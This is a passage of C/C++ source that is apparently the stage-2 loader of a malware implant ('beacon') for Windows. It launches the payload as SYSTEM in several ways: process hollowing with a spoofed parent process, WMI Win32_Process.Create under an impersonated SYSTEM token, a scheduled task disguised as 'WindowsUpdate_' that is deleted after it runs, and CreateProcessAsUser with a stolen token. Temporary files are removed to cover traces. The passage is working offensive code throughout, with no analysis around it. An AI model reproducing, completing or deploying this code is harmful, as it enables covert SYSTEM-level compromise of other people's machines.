            CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB,
            NULL,
            NULL,
            (LPSTARTUPINFOA)&extSi.si,
            &pi
        );
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        CleanupParentSpoofing(&extSi);

        if (!bSpawned) {
            DWORD err = GetLastError();
            LOGE("[-] CreateProcessA (suspended+spoofed) failed (%lu)\n", err);
            return FALSE;
        }
        LOGE("[*] Created suspended SYSTEM process PID %lu with spoofed parent\n", pi.dwProcessId);
    }

    if (!pi.hProcess) {
        LOGE("[-] Hollowing process handle is NULL before validation\n");
        return FALSE;
    }

    if (!ValidateSystemProcessStartup(pi.hProcess, pi.dwProcessId, STAGE2_SPAWN_STABLE_MS)) {
        LOGE("[-] Hollowing startup validation failed for PID %lu\n", pi.dwProcessId);
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBeacon;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        LOGE("[-] Stage2 is not a valid PE file\n");
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBeacon + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        LOGE("[-] Invalid PE NT headers\n");
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        LOGE("[-] Hollowing payload not supported for 32-bit optional header in current build.\n");
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
    if (imageSize == 0) {
        LOGE("[-] Empty PE image\n");
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    PVOID pRemoteImage = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)pNtHeaders->OptionalHeader.ImageBase,
        imageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!pRemoteImage) {
        pRemoteImage = VirtualAllocEx(
            pi.hProcess,
            NULL,
            imageSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if (!pRemoteImage) {
            LOGE("[-] VirtualAllocEx failed in hollowed process (%lu)\n", GetLastError());
            TerminateProcessIfNotStrict(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return FALSE;
        }
        LOGV("[*] Preferred BASE allocation failed for hollowed image, using fallback base %p\n", pRemoteImage);
    }

    PBYTE pMappedImage = NULL;
    SIZE_T mappedSize = 0;
    if (!BuildMappedSystemPeImage(pBeacon, dwBeaconSize, (DWORD_PTR)pRemoteImage, &pMappedImage, &mappedSize)) {
        LOGE("[-] Failed to build mapped PE image for hollowing\n");
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    if (!mappedSize || !pMappedImage) {
        LOGE("[-] Mapped image generation produced empty buffer\n");
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    pNtHeaders = (PIMAGE_NT_HEADERS)(pMappedImage + pDosHeader->e_lfanew);
    if (pNtHeaders->OptionalHeader.SizeOfImage != imageSize) {
        imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
    }

    if (imageSize > mappedSize) {
        LOGE("[-] Mapped image is smaller than declared image size\n");
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        VirtualFree(pMappedImage, 0, MEM_RELEASE);
        return FALSE;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(
            pi.hProcess,
            pRemoteImage,
            pMappedImage,
            imageSize,
            &written)) {
        LOGE("[-] Failed to write PE headers (%lu)\n", GetLastError());
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        VirtualFree(pMappedImage, 0, MEM_RELEASE);
        return FALSE;
    }
    if (written != imageSize) {
        LOGE("[-] Hollowing image write incomplete (%zu of %zu)\n", written, imageSize);
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        VirtualFree(pMappedImage, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!ApplyRemotePeSectionProtections(pi.hProcess, pRemoteImage, pNtHeaders, mappedSize)) {
        LOGE("[-] Failed to apply remote section protections\n");
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        VirtualFree(pMappedImage, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!FlushInstructionCache(pi.hProcess, pRemoteImage, imageSize)) {
        LOGV("[-] FlushInstructionCache failed for hollowed image (%lu)\n", GetLastError());
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        VirtualFree(pMappedImage, 0, MEM_RELEASE);
        return FALSE;
    }

    DWORD dwOldProtect = 0;
    if (!VirtualProtectEx(
        pi.hProcess,
        pRemoteImage,
        imageSize,
        PAGE_EXECUTE_READWRITE,
        &dwOldProtect
    )) {
        LOGV("[-] Warning: could not mark hollowed image region as executable (%lu)\n", GetLastError());
    }

    CONTEXT context = { 0 };
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &context)) {
        LOGE("[-] GetThreadContext failed (%lu)\n", GetLastError());
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

#ifdef _WIN64
    context.Rip = (DWORD64)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
#else
    context.Eax = (DWORD)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
#endif
    if (!SetThreadContext(pi.hThread, &context)) {
        LOGE("[-] SetThreadContext failed (%lu)\n", GetLastError());
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        VirtualFree(pMappedImage, 0, MEM_RELEASE);
        return FALSE;
    }

    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        LOGE("[-] ResumeThread failed (%lu)\n", GetLastError());
        TerminateProcessIfNotStrict(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        VirtualFree(pMappedImage, 0, MEM_RELEASE);
        return FALSE;
    }

    LOGE("[+] Stage2 hollowed into SYSTEM process PID %lu\n", pi.dwProcessId);
    BOOL bRunning = ValidateSystemProcessStartup(pi.hProcess, pi.dwProcessId, STAGE2_SPAWN_STABLE_MS);
    LOGE("[*] Hollowing startup validation for PID %lu result=%d\n", pi.dwProcessId, bRunning ? 1 : 0);
    if (bRunning) {
        gBeaconImplantPid = pi.dwProcessId;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    VirtualFree(pMappedImage, 0, MEM_RELEASE);
    return bRunning;
}

static BOOL LaunchViaWMI(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize) {
    if (!STAGE_ALLOW_DISK_STAGED_EXECUTION) {
        LOGV("[-] Disk-backed SYSTEM WMI launch is disabled by build configuration.\n");
        return FALSE;
    }

    char tempExePath[MAX_PATH] = { 0 };
    if (!WriteStage2SystemTempExecutable(pBeacon, dwBeaconSize, tempExePath)) {
        return FALSE;
    }

    HANDLE hImpersonationToken = NULL;
    if (!DuplicateTokenForImpersonation(hSystemToken, &hImpersonationToken)) {
        DeleteFileA(tempExePath);
        return FALSE;
    }

    if (!SetThreadToken(NULL, hImpersonationToken)) {
        LOGV("[-] Failed to set thread token for WMI (%lu)\n", GetLastError());
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    BOOL bComInitialized = FALSE;
    HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        RevertToSelf();
        DeleteFileA(tempExePath);
        return FALSE;
    }
    if (SUCCEEDED(hr)) {
        bComInitialized = TRUE;
    }

    hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE,
        NULL
    );
    if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
        if (bComInitialized) {
            CoUninitialize();
        }
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    IWbemLocator* pLoc = NULL;
    hr = CoCreateInstance(
        CLSID_WbemLocator,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator,
        (LPVOID*)&pLoc
    );
    if (FAILED(hr) || !pLoc) {
        LOGV("[-] Failed to create IWbemLocator (%lx)\n", hr);
        if (bComInitialized) {
            CoUninitialize();
        }
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    IWbemServices* pSvc = NULL;
    hr = pLoc->ConnectServer(
        _bstr_t(L"ROOT\\CIMV2"),
        NULL,
        NULL,
        0,
        0,
        0,
        0,
        &pSvc
    );
    pLoc->Release();
    if (FAILED(hr) || !pSvc) {
        LOGV("[-] WMI ConnectServer failed (%lx)\n", hr);
        if (bComInitialized) {
            CoUninitialize();
        }
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    IWbemClassObject* pClass = NULL;
    hr = pSvc->GetObject(_bstr_t(L"Win32_Process"), 0, NULL, &pClass, NULL);
    if (FAILED(hr) || !pClass) {
        LOGV("[-] Failed to get Win32_Process class (%lx)\n", hr);
        pSvc->Release();
        if (bComInitialized) {
            CoUninitialize();
        }
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    IWbemClassObject* pInParamsDefinition = NULL;
    hr = pClass->GetMethod(L"Create", 0, &pInParamsDefinition, NULL);
    pClass->Release();
    if (FAILED(hr) || !pInParamsDefinition) {
        LOGV("[-] Failed to get Create method (%lx)\n", hr);
        pSvc->Release();
        if (bComInitialized) {
            CoUninitialize();
        }
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    IWbemClassObject* pClassInstance = NULL;
    hr = pInParamsDefinition->SpawnInstance(0, &pClassInstance);
    pInParamsDefinition->Release();
    if (FAILED(hr) || !pClassInstance) {
        LOGV("[-] Failed to spawn instance (%lx)\n", hr);
        pSvc->Release();
        if (bComInitialized) {
            CoUninitialize();
        }
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    BOOL bSuccess = FALSE;
    DWORD dwSpawnPid = 0;
    for (int launchAttempt = 0; launchAttempt < 2 && !bSuccess; launchAttempt++) {
        char waitTarget[MAX_PATH] = { 0 };
        char launchCommandLine[MAX_PATH * 3] = { 0 };
        char launcherPath[MAX_PATH] = { 0 };
        char launcherArgs[MAX_PATH * 2] = { 0 };
        WCHAR wTempDirW[MAX_PATH] = { 0 };
        WCHAR wCommandLine[MAX_PATH * 2] = { 0 };
        WCHAR wTempPathW[MAX_PATH] = { 0 };

        if (launchAttempt == 0) {
            if (!BuildQuotedCommandLine(tempExePath, launchCommandLine, sizeof(launchCommandLine))) {
                LOGV("[-] Failed to build WMI direct command line for attempt %d\n", launchAttempt + 1);
                break;
            }
        } else {
            if (!BuildCommandLauncher(tempExePath, launcherPath, sizeof(launcherPath), launcherArgs, sizeof(launcherArgs))) {
                LOGV("[-] Failed to build WMI command launcher for attempt %d\n", launchAttempt + 1);
                break;
            }
            if (_snprintf(launchCommandLine, sizeof(launchCommandLine), "\"%s\" %s", launcherPath, launcherArgs) < 0) {
                LOGV("[-] Failed to build WMI command wrapper for attempt %d\n", launchAttempt + 1);
                break;
            }
        }

        if (_snprintf(waitTarget, MAX_PATH, "%s", tempExePath) < 0) {
            LOGV("[-] Failed to prepare WMI wait target for attempt %d\n", launchAttempt + 1);
            break;
        }

        MultiByteToWideChar(CP_ACP, 0, launchCommandLine, -1, wCommandLine, MAX_PATH * 2);
        MultiByteToWideChar(CP_ACP, 0, tempExePath, -1, wTempPathW, MAX_PATH);
        _snwprintf(wTempDirW, MAX_PATH, L"%s", wTempPathW);
        WCHAR* lastSlash = wcsrchr(wTempDirW, L'\\');
        if (lastSlash) {
            *lastSlash = L'\0';
        }

        VARIANT varCommand;
        VariantInit(&varCommand);
        varCommand.vt = VT_BSTR;
        varCommand.bstrVal = SysAllocString(wCommandLine);

        hr = pClassInstance->Put(
            _bstr_t(L"CommandLine"),
            0,
            &varCommand,
            0
        );
        VariantClear(&varCommand);
        if (FAILED(hr)) {
            LOGV("[-] Attempt %d: failed to set WMI CommandLine (%lx)\n", launchAttempt + 1, hr);
            continue;
        }

        VARIANT varDirectory;
        VariantInit(&varDirectory);
        varDirectory.vt = VT_BSTR;
        varDirectory.bstrVal = SysAllocString(wTempDirW);
        hr = pClassInstance->Put(_bstr_t(L"CurrentDirectory"), 0, &varDirectory, 0);
        if (FAILED(hr)) {
            LOGV("[-] Attempt %d: failed to set WMI CurrentDirectory (%lx)\n", launchAttempt + 1, hr);
        }
        VariantClear(&varDirectory);

        IWbemClassObject* pOutParams = NULL;
        hr = pSvc->ExecMethod(
            _bstr_t(L"Win32_Process"),
            _bstr_t(L"Create"),
            0,
            NULL,
            pClassInstance,
            &pOutParams,
            NULL
        );

        DWORD dwAttemptPid = 0;
        if (SUCCEEDED(hr) && pOutParams) {
            VARIANT varReturnValue;
            VARIANT varPid;
            VariantInit(&varReturnValue);
            VariantInit(&varPid);

            hr = pOutParams->Get(_bstr_t(L"ReturnValue"), 0, &varReturnValue, NULL, NULL);
            if (SUCCEEDED(hr) &&
                ((varReturnValue.vt == VT_I4 && varReturnValue.lVal == 0) ||
                 (varReturnValue.vt == VT_UI4 && varReturnValue.ulVal == 0))) {
                hr = pOutParams->Get(_bstr_t(L"ProcessId"), 0, &varPid, NULL, NULL);
                if (SUCCEEDED(hr)) {
                    if (varPid.vt == VT_I4) {
                        dwAttemptPid = (DWORD)varPid.lVal;
                    } else if (varPid.vt == VT_UI4) {
                        dwAttemptPid = varPid.ulVal;
                    } else if (varPid.vt == VT_BSTR && varPid.bstrVal) {
                        dwAttemptPid = (DWORD)_wtoi((wchar_t*)varPid.bstrVal);
                    }
                }

                if (!dwAttemptPid) {
                    WaitForSystemProcessStartByPathOrName(
                        waitTarget,
                        STAGE2_SPAWN_STARTUP_TIMEOUT_MS,
                        &dwAttemptPid
                    );
                }

                if (dwAttemptPid) {
                    HANDLE hCandidate = OpenProcess(
                        SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION,
                        FALSE,
                        dwAttemptPid
                    );
                    if (hCandidate) {
                    bSuccess = ValidateSystemProcessStartup(hCandidate, dwAttemptPid, STAGE2_SPAWN_STABLE_MS);
                        if (bSuccess) {
                            dwSpawnPid = dwAttemptPid;
                        } else {
                            LOGV("[-] WMI attempt %d process failed startup validation (pid %lu)\n",
                                launchAttempt + 1,
                                dwAttemptPid
                            );
                            TerminateProcessIfNotStrict(hCandidate, 1);
                        }
                        CloseHandle(hCandidate);
                    } else {
                        LOGV("[-] WMI attempt %d returned pid %lu but process could not be opened for validation\n",
                            launchAttempt + 1,
                            dwAttemptPid
                        );
                    }
                } else {
                    LOGV("[-] WMI attempt %d did not materialize a running process for %s\n",
                        launchAttempt + 1,
                        waitTarget
                    );
                }
            } else if (SUCCEEDED(hr)) {
                DWORD ret = 0;
                if (varReturnValue.vt == VT_I4) {
                    ret = (DWORD)varReturnValue.lVal;
                } else if (varReturnValue.vt == VT_UI4) {
                    ret = varReturnValue.ulVal;
                }
                if (!ret) {
                    LOGV("[-] WMI attempt %d returned unknown failure return value\n", launchAttempt + 1);
                } else {
                    LOGV("[-] WMI attempt %d returned error %lu\n", launchAttempt + 1, ret);
                }
            } else {
                LOGV("[-] WMI attempt %d could not read ReturnValue (%lx)\n", launchAttempt + 1, hr);
            }

            VariantClear(&varReturnValue);
            VariantClear(&varPid);
            pOutParams->Release();
        } else {
            LOGV("[-] WMI attempt %d ExecMethod failed (%lx)\n", launchAttempt + 1, hr);
        }

        if (bSuccess) {
            gBeaconImplantPid = dwSpawnPid;
            LOGV("[+] Stage2 launched via WMI under SYSTEM (PID %lu)\n", dwSpawnPid);
        } else {
            LOGV("[-] WMI attempt %d failed startup validation\n", launchAttempt + 1);
        }
    }

    if (bSuccess) {
        Sleep(STAGE2_STARTUP_TIMEOUT_MS);
    } else {
        Sleep(500);
    }

    pSvc->Release();
    if (bComInitialized) {
        CoUninitialize();
    }
    RevertToSelf();
    CloseHandle(hImpersonationToken);
    DeleteFileA(tempExePath);
    return bSuccess;
}

static BOOL LaunchViaScheduledTask(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize) {
    if (!STAGE_ALLOW_DISK_STAGED_EXECUTION) {
        LOGV("[-] Disk-backed SYSTEM scheduled-task launch is disabled by build configuration.\n");
        return FALSE;
    }

    char tempExePath[MAX_PATH] = { 0 };
    if (!WriteStage2SystemTempExecutable(pBeacon, dwBeaconSize, tempExePath)) {
        return FALSE;
    }

    HANDLE hImpersonationToken = NULL;
    if (!DuplicateTokenForImpersonation(hSystemToken, &hImpersonationToken)) {
        DeleteFileA(tempExePath);
        return FALSE;
    }
    if (!SetThreadToken(NULL, hImpersonationToken)) {
        LOGV("[-] Failed to set thread token for Task Scheduler (%lu)\n", GetLastError());
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    BOOL bComInitialized = FALSE;
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }
    if (SUCCEEDED(hr)) {
        bComInitialized = TRUE;
    }

    ITaskService* pService = NULL;
    hr = CoCreateInstance(
        CLSID_TaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskService,
        (void**)&pService
    );
    if (FAILED(hr) || !pService) {
        LOGV("[-] Failed to create TaskScheduler instance (%lx)\n", hr);
        if (bComInitialized) {
            CoUninitialize();
        }
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        LOGV("[-] ITaskService::Connect failed (%lx)\n", hr);
        pService->Release();
        if (bComInitialized) {
            CoUninitialize();
        }
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr) || !pRootFolder) {
        LOGV("[-] Cannot get Root Folder (%lx)\n", hr);
        pService->Release();
        if (bComInitialized) {
            CoUninitialize();
        }
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    BOOL bSuccess = FALSE;
    DWORD dwSpawnPid = 0;

    for (int attempt = 0; attempt < 2 && !bSuccess; attempt++) {
        ITaskDefinition* pTask = NULL;
        hr = pService->NewTask(0, &pTask);
        if (FAILED(hr) || !pTask) {
            LOGV("[-] Failed to create task definition on attempt %d (%lx)\n", attempt + 1, hr);
            continue;
        }

        ITaskSettings* pSettings = NULL;
        hr = pTask->get_Settings(&pSettings);
        if (SUCCEEDED(hr) && pSettings) {
            pSettings->put_StartWhenAvailable(VARIANT_TRUE);
            pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
            pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
            pSettings->put_AllowDemandStart(VARIANT_TRUE);
            pSettings->put_AllowHardTerminate(VARIANT_TRUE);
            pSettings->put_ExecutionTimeLimit(_bstr_t(L"PT0S"));
            pSettings->Release();
        }

        IPrincipal* pPrincipal = NULL;
        hr = pTask->get_Principal(&pPrincipal);
        if (SUCCEEDED(hr) && pPrincipal) {
            pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
            pPrincipal->put_UserId(_bstr_t(L"NT AUTHORITY\\SYSTEM"));
            pPrincipal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
            pPrincipal->Release();
        }

        char actionPath[MAX_PATH] = { 0 };
        char actionArgs[MAX_PATH * 2] = { 0 };
        WCHAR wActionPath[MAX_PATH] = { 0 };
        WCHAR wActionArgs[MAX_PATH * 2] = { 0 };
        WCHAR wTempDir[MAX_PATH] = { 0 };

        if (attempt == 0) {
            if (_snprintf(actionPath, MAX_PATH, "%s", tempExePath) < 0) {
                LOGV("[-] Failed to build direct scheduled-task action path (attempt %d)\n", attempt + 1);
                pTask->Release();
                continue;
            }
        } else {
            char launcherPath[MAX_PATH] = { 0 };
            if (!BuildCommandLauncher(tempExePath, launcherPath, sizeof(launcherPath), actionArgs, sizeof(actionArgs))) {
                LOGV("[-] Failed to build scheduled-task command wrapper (attempt %d)\n", attempt + 1);
                pTask->Release();
                continue;
            }
            if (_snprintf(actionPath, MAX_PATH, "%s", launcherPath) < 0) {
                LOGV("[-] Failed to apply scheduled-task wrapper path (attempt %d)\n", attempt + 1);
                pTask->Release();
                continue;
            }
        }

        if (actionPath[0] == '\0') {
            LOGV("[-] Scheduled-task action path is empty on attempt %d\n", attempt + 1);
            pTask->Release();
            continue;
        }

        MultiByteToWideChar(CP_ACP, 0, actionPath, -1, wActionPath, MAX_PATH);
        if (attempt > 0 && actionArgs[0] != '\0') {
            MultiByteToWideChar(CP_ACP, 0, actionArgs, -1, wActionArgs, MAX_PATH * 2);
        }

        WCHAR wTempExePath[MAX_PATH] = { 0 };
        MultiByteToWideChar(CP_ACP, 0, tempExePath, -1, wTempExePath, MAX_PATH);
        _snwprintf(wTempDir, MAX_PATH, L"%s", wTempExePath);
        WCHAR* lastSlash = wcsrchr(wTempDir, L'\\');
        if (lastSlash) {
            *lastSlash = L'\0';
        }

        BOOL bTaskActionBuilt = FALSE;
        IActionCollection* pActionCollection = NULL;
        hr = pTask->get_Actions(&pActionCollection);
        if (SUCCEEDED(hr) && pActionCollection) {
            IAction* pAction = NULL;
            hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
            if (SUCCEEDED(hr) && pAction) {
                IExecAction* pExecAction = NULL;
                hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                if (SUCCEEDED(hr) && pExecAction) {
                    if (SUCCEEDED(pExecAction->put_Path(_bstr_t(wActionPath))) &&
                        SUCCEEDED(pExecAction->put_Arguments(_bstr_t(wActionArgs))) &&
                        SUCCEEDED(pExecAction->put_WorkingDirectory(_bstr_t(wTempDir)))) {
                        bTaskActionBuilt = TRUE;
                    }
                    pExecAction->Release();
                }
                pAction->Release();
            }
            pActionCollection->Release();
        }

        if (!bTaskActionBuilt) {
            LOGV("[-] Failed to build scheduled task action (attempt %d, hr=%lx)\n", attempt + 1, hr);
            pTask->Release();
            continue;
        }

        WCHAR taskName[64] = { 0 };
        _snwprintf(taskName, STAGE_ARRAY_COUNT(taskName), L"WindowsUpdate_%lu_%d", GetTickCount(), attempt);

        IRegisteredTask* pRegisteredTask = NULL;
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(taskName),
            pTask,
            TASK_CREATE_OR_UPDATE,
            _variant_t(L"NT AUTHORITY\\SYSTEM"),
            _variant_t(),
            TASK_LOGON_SERVICE_ACCOUNT,
            _variant_t(L""),
            &pRegisteredTask
        );

        if (SUCCEEDED(hr) && pRegisteredTask) {
            IRunningTask* pRunningTask = NULL;
            hr = pRegisteredTask->Run(_variant_t(), &pRunningTask);
            if (SUCCEEDED(hr)) {
                DWORD dwAttemptPid = 0;
                if (WaitForSystemProcessStartByPathOrName(
                        tempExePath,
                        STAGE2_SPAWN_STARTUP_TIMEOUT_MS,
                        &dwAttemptPid
                    )) {
                    HANDLE hCandidate = OpenProcess(
                        SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION,
                        FALSE,
                        dwAttemptPid
                    );
                    if (hCandidate) {
                        bSuccess = ValidateSystemProcessStartup(
                            hCandidate,
                            dwAttemptPid,
                            STAGE2_SPAWN_STABLE_MS
                        );
                        if (!bSuccess) {
                            LOGV("[-] Task Scheduler-attempt %d process failed startup validation (pid %lu)\n", attempt + 1, dwAttemptPid);
                            TerminateProcessIfNotStrict(hCandidate, 1);
                        }
                        CloseHandle(hCandidate);
                    } else {
                        LOGV("[-] Task Scheduler attempt %d reported launch success but process %lu could not be opened for validation\n",
                             attempt + 1, dwAttemptPid);
                    }

                    if (bSuccess) {
                        dwSpawnPid = dwAttemptPid;
                        gBeaconImplantPid = dwSpawnPid;
                        LOGV("[+] Stage2 launched via Task Scheduler under SYSTEM (PID %lu)\n", dwSpawnPid);
                    }
                } else {
                    LOGV("[-] Task Scheduler attempt %d reported launch success but executable did not materialize in time (%s)\n",
                         attempt + 1, tempExePath);
                }

                if (pRunningTask) {
                    pRunningTask->Release();
                }
            } else {
                LOGV("[-] Task Scheduler run step failed on attempt %d (%lx)\n", attempt + 1, hr);
            }

            pRootFolder->DeleteTask(_bstr_t(taskName), 0);
            pRegisteredTask->Release();
        } else {
            LOGV("[-] RegisterTaskDefinition failed on attempt %d (%lx)\n", attempt + 1, hr);
        }

        if (bSuccess) {
            // keep this task name for logging; cleanup handled above
        } else {
            Sleep(200);
        }

        pTask->Release();
    }

    pRootFolder->Release();
    if (pService) {
        pService->Release();
    }
    if (bComInitialized) {
        CoUninitialize();
    }
    RevertToSelf();
    CloseHandle(hImpersonationToken);

    if (bSuccess) {
        Sleep(STAGE2_STARTUP_TIMEOUT_MS);
    } else {
        Sleep(500);
    }
    DeleteFileA(tempExePath);
    return bSuccess;
}

static BOOL LaunchViaCreateProcessToken(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize) {
    if (!STAGE_ALLOW_DISK_STAGED_EXECUTION) {
        LOGV("[-] Disk-backed SYSTEM primary-token CreateProcess launch is disabled by build configuration.\n");
        return FALSE;
    }

    char tempExePath[MAX_PATH] = { 0 };
    if (!WriteStage2SystemTempExecutable(pBeacon, dwBeaconSize, tempExePath)) {
        return FALSE;
    }

    HANDLE hProcess = NULL;
    DWORD dwPid = 0;
    BOOL bSuccess = FALSE;

    if (!SpawnProcessWithPrimaryToken(hSystemToken, tempExePath, &hProcess, &dwPid)) {
        LOGV("[-] SpawnProcessWithPrimaryToken failed for CreateProcess token launch (%lu)\n", GetLastError());
        DeleteFileA(tempExePath);
        return FALSE;
    }

    HANDLE hCandidate = OpenProcess(
        SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION,
        FALSE,
        dwPid
    );
    if (hCandidate) {
        bSuccess = ValidateSystemProcessStartup(hCandidate, dwPid, STAGE2_SPAWN_STABLE_MS);
        if (bSuccess) {
            gBeaconImplantPid = dwPid;
            LOGV("[+] Stage2 launched via direct CreateProcessAsUser (primary token) under SYSTEM (PID %lu)\n", dwPid);
            Sleep(STAGE2_SPAWN_STABLE_MS);
        } else {
            LOGV("[-] Direct primary-token CreateProcess validation failed (pid %lu)\n", dwPid);
            TerminateProcessIfNotStrict(hCandidate, 1);
        }
        CloseHandle(hCandidate);
    } else {
        LOGV("[-] Direct primary-token CreateProcess returned pid %lu but process could not be opened for validation (%lu)\n", dwPid, GetLastError());
        TerminateProcessIfNotStrict(hProcess, 1);
    }

    CloseHandle(hProcess);
    DeleteFileA(tempExePath);
    return bSuccess;
}

static BOOL LaunchViaCreateProcessImpersonated(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize) {
    if (!STAGE_ALLOW_DISK_STAGED_EXECUTION) {
        LOGV("[-] Disk-backed SYSTEM impersonated CreateProcess launch is disabled by build configuration.\n");
        return FALSE;
    }

    char tempExePath[MAX_PATH] = { 0 };
    if (!WriteStage2SystemTempExecutable(pBeacon, dwBeaconSize, tempExePath)) {
        return FALSE;
    }

    HANDLE hImpersonationToken = NULL;
    if (!DuplicateTokenForImpersonation(hSystemToken, &hImpersonationToken)) {
        DeleteFileA(tempExePath);
        return FALSE;
    }

    if (!SetThreadToken(NULL, hImpersonationToken)) {
        LOGV("[-] Failed to set thread token for direct CreateProcess (%lu)\n", GetLastError());
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

    STARTUPINFOA si = { 0 };
    char desktop[] = "winsta0\\default";
    si.cb = sizeof(si);
    si.lpDesktop = desktop;
    PROCESS_INFORMATION pi = { 0 };

    char cmdLine[MAX_PATH * 2] = { 0 };
    if (!BuildQuotedCommandLine(tempExePath, cmdLine, sizeof(cmdLine))) {
        RevertToSelf();
        CloseHandle(hImpersonationToken);
        DeleteFileA(tempExePath);
        return FALSE;
    }

